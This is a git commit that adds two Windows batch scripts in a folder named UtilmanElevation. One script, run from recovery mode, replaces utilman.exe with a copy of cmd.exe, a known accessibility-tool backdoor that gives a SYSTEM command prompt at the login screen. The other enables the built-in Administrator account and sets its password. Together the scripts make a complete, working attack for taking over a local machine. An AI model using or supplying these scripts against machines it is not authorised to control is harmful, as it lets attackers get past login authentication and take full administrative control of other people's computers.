c916b415a408ba3e27beb2f4187f6722581256b8
Lexcona <229240464+Lexcona@users.noreply.github.com>
2026-08-26 11:47:17 -0400

    e

---
+++ Windows/UtilmanElevation/run_in_login.bat
@@ -0,0 +1,5 @@
+net user "Administrator" /active:yes
+
+echo "Make sure the password is more than 8 characters and has numbers."
+
+net user "Administrator" *
---
+++ Windows/UtilmanElevation/run_in_recovery.bat
@@ -0,0 +1,2 @@
+move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.exe.bak
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
